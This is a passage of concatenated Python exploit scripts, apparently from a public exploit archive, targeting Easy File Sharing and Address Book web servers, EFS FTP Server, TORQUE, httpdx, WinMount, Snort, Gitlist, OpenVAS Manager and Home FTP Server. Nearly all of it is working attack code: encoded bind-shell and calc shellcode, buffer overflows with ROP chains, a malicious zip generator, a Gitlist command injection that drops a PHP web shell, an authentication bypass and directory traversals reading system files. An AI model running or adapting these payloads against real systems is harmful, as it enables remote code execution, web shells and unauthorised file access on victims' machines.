    payload =  "A"*20                               # padding
    payload += struct.pack("<I", 0x1001646a)        # call edi @LoadImage.dll
    payload += "B"*56                               # padding
    payload += struct.pack("<I", int(guess, 16))    # guessed address in stack
                                                    # containing pointer to 
													# call edi

    payload += "\x90"*20                            # nop sled 
    payload += shellcode                            # win!

    # craft the request
    buf = (
    "GET /vfolder.ghp HTTP/1.1\r\n"
    "User-Agent: Mozilla/4.0\r\n"
    "Host:" + target + ":" + str(port) + "\r\n"
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    "Accept-Language: en-us\r\n"
    "Accept-Encoding: gzip, deflate\r\n"
    "Referer: http://" + target + "/\r\n"
    "Cookie: SESSIONID=6771; UserID=" + payload + "; PassWD=;\r\n"
    "Conection: Keep-Alive\r\n\r\n"
    )

    # send the request and payload to the server
    s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s1.connect((target, port))
    s1.send(buf)
    s1.close()


#!/usr/bin/env python

# Exploit Title: Easy Address Book Web Server 1.6 stack buffer overflow
# Date: 19 May 2014
# Exploit Author: superkojiman - http://www.techorganic.com
# Vendor Homepage: http://www.efssoft.com/web-address-book-server.html
# Software Link: http://www.efssoft.com/eabws.exe
# Version: 1.6
# Tested on: English version of Windows XP Professional SP2 and SP3
#
# Description: 
# By setting UserID in the cookie to a long string, we can overwrite EDX which 
# allows us to control execution flow when "call dword ptr [edx+28h]" is 
# executed. EDX is overwritten with an address pointing to a location on the 
# stack which in turn points to a NOP sled leading to the shellcode. This 
# address on the stack is brute forced, but doesn't take long since only the 
# 2nd byte is always different, so the address is always 0x01??B494.  
# 
# It's similar to Easy File Sharing Web Server 6.8 exploit here. 
# http://www.exploit-db.com/exploits/33352/ I suspect same code reused for 
# their Web Server series of applications. 
#
# Tested with Easy Address Book Web Server installed in the default location 
# at C:\EFS Software\Easy Address Book Web Server
#
# The exploit can sometimes fail the first time, so try a few more times and 
# you might get a shell. 

import socket
import struct
import sys

target = "172.16.229.134"
port = 80


# Shellcode from https://code.google.com/p/w32-bind-ngs-shellcode/
# Binds a shell on port 28876
# msfencode -b '\x00\x20' -i w32-bind-ngs-shellcode.bin 
# [*] x86/shikata_ga_nai succeeded with size 241 (iteration=1)
shellcode = (
"\xbb\xa1\x68\xde\x7c\xdd\xc0\xd9\x74\x24\xf4\x58\x33\xc9" +
"\xb1\x36\x31\x58\x14\x83\xe8\xfc\x03\x58\x10\x43\x9d\xef" +
"\xb5\xe7\xd5\x61\x76\x6c\x9f\x8d\xfd\x04\x7c\x05\x6f\xe0" +
"\xf7\x67\x50\x7b\x31\xa0\xdf\x63\x4b\x23\x8e\xfb\x81\x9c" +
"\x02\xc9\x8d\x44\x33\x5a\x3d\xe1\x0c\x2b\xc8\x69\xfb\xd5" +
"\x7e\x8a\xd5\xd5\xa8\x41\xac\x02\x7c\xaa\x05\x8d\xd0\x0c" +
"\x0b\x5a\x82\x0d\x44\x48\x80\x5d\x10\xcd\xf4\xea\x7a\xf0" +
"\x7c\xec\x69\x81\x36\xce\x6c\x7c\x9e\x3f\xbd\x3c\x94\x74" +
"\xd0\xc1\x44\xc0\xe4\x6d\xac\x58\x21\xa9\xf1\xeb\x44\xc6" +
"\x30\x2b\xd2\xc3\x1b\xb8\x57\x37\xa5\x57\x68\x80\xb1\xf6" +
"\xfc\xa5\xa5\xf9\xeb\xb0\x3e\xfa\xef\x53\x15\x7d\xd1\x5a" +
"\x1f\x76\xa3\x02\xdb\xd5\x44\x6a\xb4\x4c\x3a\xb4\x48\x1a" +
"\x8a\x96\x03\x1b\x3c\x8b\xa3\x34\x28\x52\x74\x4b\xac\xdb" +
"\xb8\xd9\x43\xb4\x13\x48\x9b\xea\xe9\xb3\x17\xf2\xc3\xe1" +
"\x8a\x6a\x47\x6b\x4f\x4a\x0a\x0f\xab\xb2\xbf\x5b\x18\x04" +
"\xf8\x72\x5e\xdc\x80\xb9\x45\x8b\xdc\x93\xd7\xf5\xa6\xfc" +
"\xd0\xae\x7a\x51\xb6\x02\x84\x03\xdc\x29\x3c\x50\xf5\xe7" +
"\x3e\x57\xf9"
)

for i in xrange(1,255):
    n = ""
    if i < 16:
        n = "0" + hex(i)[-1]
    else:
        n = hex(i)[2:]
 
    guess = "0x01" + n + "b494"     # value of edx used in 
                                    # "call dword ptr ds:[edx+28]
                                    # only 2nd byte changes in stack address

    nops = int(guess, 16) + 129     # addres sof nop sled is guess+129 bytes

    print "[+] Trying guess at", guess

    payload =  struct.pack("<I", nops)          # pointer to nop sled
    payload += "A"*76                           # padding
    payload += struct.pack("<I", int(guess,16)) # address containing pointer to 
                                                # nop sled

    payload += "\x90"*20                        # nop sled
    payload += shellcode                        # win!
                
    # craft the request
    buf = (
    "GET /addrbook.ghp HTTP/1.1\r\n"
    "User-Agent: Mozilla/4.0\r\n"
    "Host:" + target + ":" + str(port) + "\r\n"
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    "Accept-Language: en-us\r\n"
    "Accept-Encoding: gzip, deflate\r\n"
    "Referer: http://" + target + "/\r\n"
    "Cookie: SESSIONID=6771; UserID=" + payload + "; PassWD=;\r\n"
    "Conection: Keep-Alive\r\n\r\n"
    )

    try:
        # send the request and payload to the server
        s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s1.connect((target, port))
        s1.send(buf)
        s1.close()
    except Exception,e: 
        pass
    
    try:
        # check if we guessed the correct address by connecting to port 28876
        s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s2.connect((target, 28876))
        s2.close()
        print "\n[+] Success! A shell is waiting on port 28876!"
        sys.exit(0)
    except Exception,e:
        pass

print "\n[!] Didn't work. Sometimes it takes a few tries, so try again."
#!/usr/bin/env python
# Exploit Title: Easy File Sharing FTP Server 3.5 stack buffer overflow
# Date: 27 May 2014
# Exploit Author: superkojiman - http://www.techorganic.com
# Vulnerability discovered by: h07
# CVE: CVE-2006-3952
# OSVDB: 27646
# Vendor Homepage: http://www.efssoft.com
# Software Link: http://www.efssoft.com/ftpserver.htm
# Version: 3.5
# Tested on: Windows 8.1 Enterprise , English
#          : Windows 7 Enterprise SP1, English
#          : Windows XP SP3, English
#
# Description: 
# A buffer overflow is triggered when when a large password is sent to the 
# server.
#
# h07 found this bug in 2006, targetting EFS FTP Server 2.0. The original 
# exploits relied on OS DLLs to reference a pop/pop/retn address to leverage a 
# SEH attack. This was a bit unreliable as different versions of Windows would 
# have different addresses and the exploit would need to be modified with the 
# correct pop/pop/retn address. 
#
# Fast forward to 2014. EFS FTP Server is now at version 3.5 (2012) and 
# includes new features, such as SSL support. Ironically, by adding SSL 
# support, they've given us a reliable pop/pop/retn address in the included 
# SSLEAY32.DLL! This exploit should work reliably with any Windows release. 


import socket
import struct

# calc shellcode from https://code.google.com/p/win-exec-calc-shellcode/
# msfencode -b "\x00\x20" -i w32-exec-calc-shellcode.bin 
# [*] x86/shikata_ga_nai succeeded with size 101 (iteration=1)
shellcode = ( 
"\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9" +
"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56" +
"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9" +
"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97" +
"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64" +
"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8" +
"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a" +
"\x1c\x39\xbd"
)

payload = "\x2c"
payload += "A"*2559
payload += "\xeb\x19\x90\x90"               # jmp to nop sled + shellcode
payload += struct.pack("<I", 0x10017F21)    # pop/pop/ret, SSLEAY32.DLL
payload += "\x90"*30
payload += shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.130", 21))
s.recv(1024)
s.send("USER anonymous\r\n")
s.recv(1024)
s.send("PASS " + payload + "\r\n")
s.recv(1024)
s.close()
#!/usr/bin/env python
# Exploit Title: TORQUE Resource Manager 2.5.x-2.5.13 stack based buffer overflow stub
# Date: 27 May 2014
# Exploit Author: bwall - @botnet_hunter
# Vulnerability discovered by: MWR Labs
# CVE: CVE-2014-0749
# Vendor Homepage: http://www.adaptivecomputing.com/
# Software Link: http://www.adaptivecomputing.com/support/download-center/torque-download/
# Version: 2.5.13
# Tested on: Manjaro x64
# Description:
# A buffer overflow while parsing the DIS network communication protocol.  It is triggered when requesting that
# a larger amount of data than the small buffer be read.  The first digit supplied is the number of digits in the
# data, the next digits are the actual size of the buffer.
#
# This is an exploit stub, meant to be a quick proof of concept.  This was built and tested for a 64 bit system
# with ASLR disabled.  Since Adaptive Computing does not supply binary distributions, TORQUE will likely be
# compiled on the target system.  The result of this exploit is intended to just point RIP at 'exit()'

import socket


ip = "172.16.246.177"
port = 15001

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

offset = 143
header = str(len(str(offset))) + str(offset) + '1'

packet = header
packet += "\x00" * (140 - len(packet))
packet += ('\xc0\x18\x76\xf7\xff\x7f\x00\x00') # exit() may require a different offset in your build

s.sendall(packet)
data = s.recv(1024)
s.close()#!/usr/bin/python
# Exploit Title: Easy File Management Web Server v5.3 - USERID Remote Buffer Overflow (ROP)
# Version:       5.3
# Date:          2014-05-31
# Author:        Julien Ahrens (@MrTuxracer)
# Homepage:      http://www.rcesecurity.com
# Software Link: http://www.efssoft.com/
# Tested on:     WinXP-GER, Win7x64-GER, Win8-EN, Win8x64-GER
#
# Credits for vulnerability discovery:
# superkojiman (http://www.exploit-db.com/exploits/33453/)
#
# Howto / Notes:
# This scripts exploits the buffer overflow vulnerability caused by an oversized UserID - string as
# discovered by superkojiman. In comparison to superkojiman's exploit, this exploit does not 
# brute force the address of the overwritten stackpart, instead it uses code from its own 
# .text segment to achieve reliable code execution.

from struct import pack
import socket,sys
import os
 
host="192.168.0.1"
port=80
 
junk0 = "\x90" * 80

# Instead of bruteforcing the stack address, let's take an address
# from the .text segment, which is near to the stackpivot instruction:
# 0x1001d89b : {pivot 604 / 0x25c} # POP EDI # POP ESI # POP EBP # POP EBX # ADD ESP,24C # RETN [ImageLoad.dll] 
# The memory located at 0x1001D8F0: "\x7A\xD8\x01\x10" does the job!
# Due to call dword ptr [edx+28h]: 0x1001D8F0 - 28h = 0x1001D8C8
call_edx=pack('<L',0x1001D8C8) 

junk1="\x90" * 280
ppr=pack('<L',0x10010101) # POP EBX # POP ECX # RETN [ImageLoad.dll]

# Since 0x00 would break the exploit, the 0x00457452 (JMP ESP [fmws.exe]) needs to be crafted on the stack
crafted_jmp_esp=pack('<L',0xA445ABCF)

test_bl=pack('<L',0x10010125) # contains 00000000 to pass the JNZ instruction

kungfu=pack('<L',0x10022aac)  # MOV EAX,EBX # POP ESI # POP EBX # RETN [ImageLoad.dll]
kungfu+=pack('<L',0xDEADBEEF) # filler
kungfu+=pack('<L',0xDEADBEEF) # filler
kungfu+=pack('<L',0x1001a187) # ADD EAX,5BFFC883 # RETN [ImageLoad.dll] # finish crafting JMP ESP
kungfu+=pack('<L',0x1002466d) # PUSH EAX # RETN [ImageLoad.dll]

nopsled="\x90" * 20

# windows/exec CMD=calc.exe 
# Encoder: x86/shikata_ga_nai
# powered by Metasploit 
# msfpayload windows/exec CMD=calc.exe R | msfencode -b '\x00\x0a\x0d'

shellcode=("\xda\xca\xbb\xfd\x11\xa3\xae\xd9\x74\x24\xf4\x5a\x31\xc9" +
"\xb1\x33\x31\x5a\x17\x83\xc2\x04\x03\xa7\x02\x41\x5b\xab" +
"\xcd\x0c\xa4\x53\x0e\x6f\x2c\xb6\x3f\xbd\x4a\xb3\x12\x71" +
"\x18\x91\x9e\xfa\x4c\x01\x14\x8e\x58\x26\x9d\x25\xbf\x09" +
"\x1e\x88\x7f\xc5\xdc\x8a\x03\x17\x31\x6d\x3d\xd8\x44\x6c" +
"\x7a\x04\xa6\x3c\xd3\x43\x15\xd1\x50\x11\xa6\xd0\xb6\x1e" +
"\x96\xaa\xb3\xe0\x63\x01\xbd\x30\xdb\x1e\xf5\xa8\x57\x78" +
"\x26\xc9\xb4\x9a\x1a\x80\xb1\x69\xe8\x13\x10\xa0\x11\x22" +
"\x5c\x6f\x2c\x8b\x51\x71\x68\x2b\x8a\x04\x82\x48\x37\x1f" +
"\x51\x33\xe3\xaa\x44\x93\x60\x0c\xad\x22\xa4\xcb\x26\x28" +
"\x01\x9f\x61\x2c\x94\x4c\x1a\x48\x1d\x73\xcd\xd9\x65\x50" +
"\xc9\x82\x3e\xf9\x48\x6e\x90\x06\x8a\xd6\x4d\xa3\xc0\xf4" +
"\x9a\xd5\x8a\x92\x5d\x57\xb1\xdb\x5e\x67\xba\x4b\x37\x56" +
"\x31\x04\x40\x67\x90\x61\xbe\x2d\xb9\xc3\x57\xe8\x2b\x56" +
"\x3a\x0b\x86\x94\x43\x88\x23\x64\xb0\x90\x41\x61\xfc\x16" +
"\xb9\x1b\x6d\xf3\xbd\x88\x8e\xd6\xdd\x4f\x1d\xba\x0f\xea" +
"\xa5\x59\x50")

payload=junk0 + call_edx + junk1 + ppr + crafted_jmp_esp + test_bl + kungfu + nopsled + shellcode

buf="GET /vfolder.ghp HTTP/1.1\r\n"
buf+="User-Agent: Mozilla/4.0\r\n"
buf+="Host:" + host + ":" + str(port) + "\r\n"
buf+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buf+="Accept-Language: en-us\r\n"
buf+="Accept-Encoding: gzip, deflate\r\n"
buf+="Referer: http://" + host + "/\r\n"
buf+="Cookie: SESSIONID=1337; UserID=" + payload + "; PassWD=;\r\n"
buf+="Conection: Keep-Alive\r\n\r\n"


print "[*] Connecting to Host " + host + "..."

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    connect=s.connect((host, port))
    print "[*] Connected to " + host + "!"
except:
    print "[!] " + host + " didn't respond\n"
    sys.exit(0)
    
print "[*] Sending malformed request..."
s.send(buf)

print "[!] Exploit has been sent!\n"
s.close()
source: http://www.securityfocus.com/bid/38242/info

The 'httpdx' program is prone to a directory-traversal vulnerability because it fails to sufficiently sanitize user-supplied input.

Exploiting this issue allows an authenticated user to create directories outside the FTP root directory, which may lead to other attacks.

This issue affects httpdx 1.5; other versions may also be affected. 

# Exploit Title: httpdx - ultralight http/ftp server directory Traversal
# Date: 14/2/2010
# Author: FB1H2S
# Software Link: http://sourceforge.net/projects/httpdx/
# Version: v1.5
# Tested on: WIN XP2
# CVE : [if exists]
# Code : Attached
 
#!/usr/bin/python
# Greetz to all Darkc0de, Andhra Hackers and ICW Memebers                              
#Thanks  : Mr bond,Wipu,GOdwinAustin,The_empty,beenu,hg_H@x0r,r45c4l,it_security,eberly
#Shoutz  : SMART_HAX0R,j4ckh4x0r,41w@r10r,Hackuin
import socket
import sys
hostname='localhost'
username='admin'
passwd='password'
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    sock.connect((hostname, 21))
except:
    print ("Connection error!")
    sys.exit(1)
r=sock.recv(1024)
sock.send("user %s\r\n" %username)
r=sock.recv(1024)
sock.send("pass %s\r\n" %passwd)
r=sock.recv(1024)
# The FTP root is example.com we could move down the root directory
sock.send("MKD ../fb1h2s\r\n")
sock.close()
sys.exit(0);
source: http://www.securityfocus.com/bid/39557/info

WinMount is prone to a remote buffer-overflow vulnerability because the application fails to perform adequate boundary checks on user-supplied data.

An attacker can exploit this issue to execute arbitrary code with the privileges of the user running the affected application. Failed exploit attempts will result in a denial-of-service condition.

WinMount 3.3.0401 is vulnerable; other versions may be affected. 

import os

sploitfile="test.zip"
ldf_header =('\x50\x4B\x03\x04\x14\x00\x00'
'\x00\x08\x00\xB7\xAC\xCE\x34\x00\x00\x00'
'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
'\xd0\xff'
'\x00\x00\x00')
cdf_header = ("\x50\x4B\x01\x02\x14\x00\x14"
"\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\xd0\xff"
"\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00")
eofcdf_header = ("\x50\x4B\x05\x06\x00\x00\x00"
"\x00\x01\x00\x01\x00"
"\xfe\xff\x00\x00"
"\xee\xff\x00\x00"
"\x00\x00")
print "[+] Preparing payload\n"
size=65484
junk='A'*420
nseh='\x89\x8a\x8b\x8c'
seh='\x84\x5b\xac\x8d'
junk_='A'*33
jumpto='\x05\x12\x11\x46\x2d\x11\x11\x46\x50\x46\xac\xe4'#make eax point to shellcode and jump to shellcode
shellcode=("the shellcode here will be changed into unicode")#encode by alpha2
junk__='B'*80
last='C'*(size-420-len(nseh+seh+junk_+jumpto+junk__+shellcode))
payload=junk+nseh+seh+junk_+jumpto+junk__+shellcode+last+".wav"
evilzip = ldf_header+payload+cdf_header+payload+eofcdf_header
print "[+] Removing old zip file\n"
os.system("del "+sploitfile)
print "[+] Writing payload to file\n"
fobj=open(sploitfile,"w",0)
fobj.write(evilzip)
print "generate zip file "+(sploitfile)
fobj.close()
print '[+] Wrote %d bytes to file sploitfile\n'%(len(evilzip))
print "[+] Payload length :%d \n"%(len(payload))

#!/usr/bin/python
#
# Snort DCE/RPC Preprocessor Buffer Overflow (Command Execution Version)
# 
# Author: Trirat Puttaraksa <trir00t [at] gmail.com>
#
# http://sf-freedom.blogspot.com
#
######################################################
# For educational purpose only
#
# This exploit call calc.exe on Windows XP SP2 + Snort 2.6.1
#
# Note: this exploit use Scapy (http://www.secdev.org/projects/scapy/) 
# to inject the packet, so you have to install Scapy before use it.
#
#######################################################

import sys
from scapy import *
from struct import pack
conf.verb = 0

# NetBIOS Session Service
payload = "\x00\x00\x02\xab"

# SMB Header
payload += "\xff\x53\x4d\x42\x75\x00\x00\x00\x00\x18\x07\xc8\x00\x00"
payload += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe"
payload += "\x00\x08\x30\x00"

# Tree Connect AndX Request
payload += "\x04\xa2\x00\x52\x00\x08\x00\x01\x00\x27\x00\x00"
payload += "\x5c\x00\x5c\x00\x49\x00\x4e\x00\x53\x00\x2d\x00\x4b\x00\x49\x00"
payload += "\x52\x00\x41\x00\x5c\x00\x49\x00\x50\x00\x43\x00\x24\x00\x00\x00"
payload += "\x3f\x3f\x3f\x3f\x3f\x00"

# NT Create AndX Request
payload += "\x18\x2f\x00\x96\x00\x00\x0e\x00\x16\x00\x00\x00\x00\x00\x00\x00"
payload += "\x9f\x01\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
payload += "\x03\x00\x00\x00\x01\x00\x00\x00\x40\x00\x40\x00\x02\x00\x00\x00"
payload += "\x01\x11\x00\x00\x5c\x00\x73\x00\x72\x00\x76\x00\x73\x00\x76\x00"
payload += "\x63\x00\x00\x00"

# Write AndX Request #1
payload += "\x0e\x2f\x00\xfe\x00\x00\x40\x00\x00\x00\x00\xff\xff\xff\xff\x80"
payload += "\x00\x48\x00\x00\x00\x48\x00\xb6\x00\x00\x00\x00\x00\x49\x00\xee"

#payload += "\x05\x00\x0b\x03\x10\x00\x00\x00\xff\x01\x00\x00\x01\x00\x00\x00"
payload += "\x05\x00\x0b\x03\x10\x00\x00\x00\x10\x02\x00\x00\x01\x00\x00\x00"
payload += "\xb8\x10\xb8\x10\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
payload += "\xc8\x4f\x32\x4b\x70\x16\xd3\x01\x12\x78\x5a\x47\xbf\x6e\xe1\x88"
payload += "\x03\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00"
payload += "\x2b\x10\x48\x60\x02\x00\x00\x00"

# Write AndX Request #2
payload += "\x0e\xff\x00\xde\xde\x00\x40\x00\x00\x00\x00\xff\xff\xff\xff\x80"
payload += "\x00\x48\x00\x00\x00\xff\x01\xce\x01\x00\x00\x00\x00\x49\x00\xee"

# 0x7c941eed -> jmp esp; make stack happy; windows/exec calc.exe (metasploit.com)
payload += "\xed\x1e\x94\x7c\x90\x81\xc4\xff\xef\xff\xff\x44"

payload += "\x31\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xa9"
payload += "\xd1\x80\xf5\x83\xeb\xfc\xe2\xf4\x55\x39\xc4\xf5\xa9\xd1\x0b\xb0"
payload += "\x95\x5a\xfc\xf0\xd1\xd0\x6f\x7e\xe6\xc9\x0b\xaa\x89\xd0\x6b\xbc"
payload += "\x22\xe5\x0b\xf4\x47\xe0\x40\x6c\x05\x55\x40\x81\xae\x10\x4a\xf8"
payload += "\xa8\x13\x6b\x01\x92\x85\xa4\xf1\xdc\x34\x0b\xaa\x8d\xd0\x6b\x93"
payload += "\x22\xdd\xcb\x7e\xf6\xcd\x81\x1e\x22\xcd\x0b\xf4\x42\x58\xdc\xd1"
payload += "\xad\x12\xb1\x35\xcd\x5a\xc0\xc5\x2c\x11\xf8\xf9\x22\x91\x8c\x7e"
payload += "\xd9\xcd\x2d\x7e\xc1\xd9\x6b\xfc\x22\x51\x30\xf5\xa9\xd1\x0b\x9d"
payload += "\x95\x8e\xb1\x03\xc9\x87\x09\x0d\x2a\x11\xfb\xa5\xc1\xaf\x58\x17"
payload += "\xda\xb9\x18\x0b\x23\xdf\xd7\x0a\x4e\xb2\xe1\x99\xca\xff\xe5\x8d"
payload += "\xcc\xd1\x80\xf5"

payload += "\x90"  # padding

if len(sys.argv) != 2:
	print "Usage snort_execute_dcerpc.py <fake destination ip>"
	sys.exit(1)

target = sys.argv[1]

p = IP(dst=target) / TCP(sport=1025, dport=139, flags="PA") / payload
send(p)

# milw0rm.com [2007-03-01]
from commands import getoutput
import urllib
import sys

""" 
Exploit Title: Gitlist <= 0.4.0 anonymous RCE
Date: 06/20/2014
Author: drone (@dronesec)
Vendor Homepage: http://gitlist.org/
Software link: https://s3.amazonaws.com/gitlist/gitlist-0.4.0.tar.gz
Version: <= 0.4.0
Fixed in: 0.5.0
Tested on: Debian 7
More information: http://hatriot.github.io/blog/2014/06/29/gitlist-rce/
cve: CVE-2014-4511
"""

if len(sys.argv) <= 1:
    print '%s: [url to git repo] {cache path}' % sys.argv[0]
    print '  Example: python %s http://localhost/gitlist/my_repo.git' % sys.argv[0]
    print '  Example: python %s http://localhost/gitlist/my_repo.git /var/www/git/cache' % sys.argv[0]
    sys.exit(1)

url = sys.argv[1]
url = url if url[-1] != '/' else url[:-1]

path = "/var/www/gitlist/cache"
if len(sys.argv) > 2:
    path = sys.argv[2]

print '[!] Using cache location %s' % path

# payload <?system($_GET['cmd']);?>
payload = "PD9zeXN0ZW0oJF9HRVRbJ2NtZCddKTs/Pgo="

# sploit; python requests does not like this URL, hence wget is used
mpath = '/blame/master/""`echo {0}|base64 -d > {1}/x.php`'.format(payload, path)
mpath = url+ urllib.quote(mpath)

out = getoutput("wget %s" % mpath)
if '500' in out:
    print '[!] Shell dropped; go hit %s/cache/x.php?cmd=ls' % url.rsplit('/', 1)[0]
else:
    print '[-] Failed to drop'
    print out
#!/usr/bin/python

# Exploit Title: OpenVAS Manager 4.0 Authentication Bypass Vulnerability PoC 
# Date: 09/07/2014
# Exploit Author: EccE
# Vendor Homepage: http://www.openvas.org/
# Software Link: http://wald.intevation.org/frs/?group_id=29
# Version: OpenVAS Manager 4.0 
# Tested on: Debian GNU/Linux testing (jessie)
# CVE : CVE-2013-6765

"""	
	Small list of working commands

get_agents 
get_configs 
get_alerts
get_filters
get_lsc_credentials 
get_notes 
get_nvts 
get_targets
get_users
get_schedules


More commands (~70 commands) can be found directly in the omc.c file. Not all of them are working though. 
As designed in OMP protocol, commands must be sent this way : <COMMAND/>

"""

import socket, ssl

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Require a certificate from the server. We used a self-signed certificate
# so here cacerts.pem must be the server certificate itself.
ssl_sock = ssl.wrap_socket(s,
                           ca_certs="/var/lib/openvas/CA/cacert.pem", 
                           cert_reqs=ssl.CERT_REQUIRED)

# OpenVAS Manager listen by default on localhost tcp/9390
ssl_sock.connect(('localhost', 9390))


print "#################################################################"
print "# Proof of Concept - OpenVAS Manager 4.0 Authentication Bypass  #"
print "#################################################################"
print "\n"

print "--> Retrieving version...(exploiting the bug !)\n"
ssl_sock.write("<get_version/>")
data = ssl_sock.read()
print data
print "\n"


print "--> Retrieving slaves...\n"
ssl_sock.write("<get_slaves/>")
tasks = ssl_sock.read()
print tasks
print "\n"

"""
print "--> Creating note...\n"
ssl_sock.write("<create_note/>")
note = ssl_sock.read()
print note 

print "--> Retrieving users list...\n"
ssl_sock.write("<get_users/>")
users_list = ssl_sock.read()
print users_list
"""
ssl_sock.close()
source: http://www.securityfocus.com/bid/40419/info

Home FTP Server is prone to a directory-traversal vulnerability because it fails to sufficiently sanitize user-supplied input.

Exploiting this issue can allow an attacker to download, upload, and delete arbitrary files outside of the FTP server's root directory. This may aid in further attacks.

Home FTP Server 1.10.2.143 and 1.11.1.149 are vulnerable; other versions may also be affected. 

#============================================================================================================#
#   _      _   __   __       __        _______    _____      __ __     _____     _      _    _____  __ __    #
#  /_/\  /\_\ /\_\ /\_\     /\_\     /\_______)\ ) ___ (    /_/\__/\  ) ___ (   /_/\  /\_\ /\_____\/_/\__/\  #
#  ) ) )( ( ( \/_/( ( (    ( ( (     \(___  __\// /\_/\ \   ) ) ) ) )/ /\_/\ \  ) ) )( ( (( (_____/) ) ) ) ) #
# /_/ //\\ \_\ /\_\\ \_\    \ \_\      / / /   / /_/ (_\ \ /_/ /_/ // /_/ (_\ \/_/ //\\ \_\\ \__\ /_/ /_/_/  #
# \ \ /  \ / // / // / /__  / / /__   ( ( (    \ \ )_/ / / \ \ \_\/ \ \ )_/ / /\ \ /  \ / // /__/_\ \ \ \ \  #
#  )_) /\ (_(( (_(( (_____(( (_____(   \ \ \    \ \/_\/ /   )_) )    \ \/_\/ /  )_) /\ (_(( (_____\)_) ) \ \ #
#  \_\/  \/_/ \/_/ \/_____/ \/_____/   /_/_/     )_____(    \_\/      )_____(   \_\/  \/_/ \/_____/\_\/ \_\/ #
#                                                                                                            #
#============================================================================================================#
#                                                                                                            #
# Vulnerability............Directory Traversal                                                               #
# Software.................Home FTP Server 1.10.2.143                                                        #
# Download.................http://downstairs.dnsalias.net/files/HomeFtpServerInstall.exe                     #
# Date.....................5/27/10                                                                           #
#                                                                                                            #
#============================================================================================================#
#                                                                                                            #
# Site.....................http://cross-site-scripting.blogspot.com/                                         #
# Email....................john.leitch5@gmail.com                                                            #
#                                                                                                            #
#============================================================================================================#
#                                                                                                            #
# ##Description##                                                                                            #
#                                                                                                            #
# A directory traversal vulnerability in Home FTP Server 1.10.2.143 can be exploited to read, write, and     #
# delete files outside of the ftp root directory.                                                            #
#                                                                                                            #
#                                                                                                            #
# ##Exploit##                                                                                                #
#                                                                                                            #
# RETR [Drive Letter]:\[Filename]                                                                            #
# STOR [Drive Letter]:\[Filename]                                                                            #
# DELE [Drive Letter]:\[Filename]                                                                            #
#                                                                                                            #
#                                                                                                            #
# ##Proof of Concept##                                                                                       #
#                                                                                                            #
import sys, socket, re

host = 'localhost'
port = 21
user = 'anonymous'
password = ''

timeout = 8

buffer_size = 8192

def get_data_port(s):
    s.send('PASV\r\n')
    
    resp =  s.recv(buffer_size)

    pasv_info = re.search(u'(\d+),' * 5 + u'(\d+)', resp)

    if (pasv_info == None):
        raise Exception(resp)
                    
    return int(pasv_info.group(5)) * 256 + int(pasv_info.group(6))

def retr_file(s, filename):
    pasv_port = get_data_port(s)

    if (pasv_port == None):        
        return None    

    s.send('RETR ' + filename + '\r\n')
    resp = s.recv(8192)    

    if resp[:3] != '150': raise Exception(resp)

    print resp
    
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
    s2.connect((host, pasv_port))
    s2.settimeout(2.0)                                     
    resp = s2.recv(8192)
    s2.close()    

    return resp

def get_file(filename):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(timeout)

    print s.recv(buffer_size)            

    s.send('USER ' + user + '\r\n')                   
    print s.recv(buffer_size)            

    s.send('PASS ' + password + '\r\n')               
    print s.recv(buffer_size)

    print retr_file(s, filename)

    print s.recv(buffer_size)        

    s.close()

get_file('c:\\boot.ini')

